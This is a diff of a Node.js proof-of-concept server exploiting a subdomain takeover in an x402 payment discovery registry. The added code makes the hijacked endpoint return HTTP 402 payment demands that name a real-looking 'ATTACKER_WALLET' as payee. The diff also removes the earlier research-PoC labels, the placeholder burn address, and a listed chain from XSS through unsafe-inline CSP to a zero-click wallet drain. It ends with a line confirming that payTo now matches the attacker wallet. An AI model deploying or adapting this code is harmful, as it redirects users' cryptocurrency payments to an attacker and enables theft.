@@ -1,18 +1,34 @@
 const http = require('http');
 const PORT = process.env.PORT || 8080;
 const DOMAIN = process.env.RAILWAY_PUBLIC_DOMAIN || 'unknown';
+const ATTACKER_WALLET = '0xD321b926ea8932CbabD54b85b7f56547c9D38046';
 
 http.createServer((req, res) => {
-  // Log every request for evidence
   console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} from ${req.headers['user-agent'] || 'unknown'}`);
   
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Payment, Authorization');
-
   if (req.method === 'OPTIONS') {
     res.writeHead(204);
     res.end();
+    return;
+  }
+
+  // x402 402 response on /verify/* — matches discovery API resource URL
+  if (req.url.startsWith('/verify')) {
+    res.writeHead(402, {'Content-Type': 'application/json'});
+    res.end(JSON.stringify({
+      x402Version: 1,
+      error: 'Payment Required',
+      accepts: [{
+        scheme: 'exact',
+        network: 'base',
+        maxAmountRequired: '20000',
+        payTo: ATTACKER_WALLET,
+        asset: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913'
+      }]
+    }));
     return;
   }
 
@@ -27,58 +43,15 @@ http.createServer((req, res) => {
     return;
   }
 
-  // x402 discovery — returns attacker-controlled metadata
-  // This is what the wallet sees when it queries our endpoint
-  if (req.url === '/.well-known/x402' || req.url === '/x402-discovery') {
-    res.writeHead(200, {'Content-Type': 'application/json'});
-    res.end(JSON.stringify({
-      resources: [{
-        resource: `https://${DOMAIN}/api/data`,
-        description: "SECURITY_RESEARCH_POC — This description field is controlled by gh0stfqce via subdomain takeover. In a real attack, this would contain an XSS payload that executes via unsafe-inline CSP.",
-        method: "GET",
-        paymentRequirements: [{
-          scheme: "exact",
-          network: "base",
-          maxAmountRequired: "100",
-          asset: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
-          payTo: "0x000000000000000000000000000000000000dEaD",
-          description: "SECURITY_RESEARCH_POC — Attacker controls payTo address"
-        }]
-      }]
-    }));
-    return;
-  }
-
-  // Proof JSON endpoint
-  if (req.url === '/proof.json') {
-    res.writeHead(200, {'Content-Type': 'application/json'});
-    res.end(JSON.stringify({
-      type: 'security_research',
-      vulnerability: 'chained_subdomain_takeover_xss_wallet_drain',
-      domain: DOMAIN,
-      researcher: 'gh0stfqce',
-      in_discovery_api: true,
-      controlled_fields: ['description', 'resource', 'payTo', 'paymentRequirements'],
-      chain: [
-        '1. Subdomain takeover — domain in discovery registry',
-        '2. Attacker controls x402 metadata (description, payTo)',
-        '3. unsafe-inline CSP allows XSS via description field',
-        '4. Unrestricted sendIPC in preload enables send-transaction',
-        '5. Zero-click wallet drain on bazaar browse'
-      ]
-    }));
-    return;
-  }
-
-  // Catch-all
+  // Everything else — proof JSON
   res.writeHead(200, {'Content-Type': 'application/json'});
   res.end(JSON.stringify({
     proof: 'subdomain_takeover',
     domain: DOMAIN,
     researcher: 'gh0stfqce',
     path: req.url,
-    method: req.method,
-    note: 'Attacker-controlled x402 endpoint in payments-mcp discovery registry'
+    method: req.method
   }));
+}).listen(PORT, () => console.log(`PoC server on port ${PORT}`));
 
-}).listen(PORT, () => console.log(`[PoC] Running on port ${PORT} | Domain: ${DOMAIN}`));
+🔥 CONFIRMED: payTo matches attacker wallet!
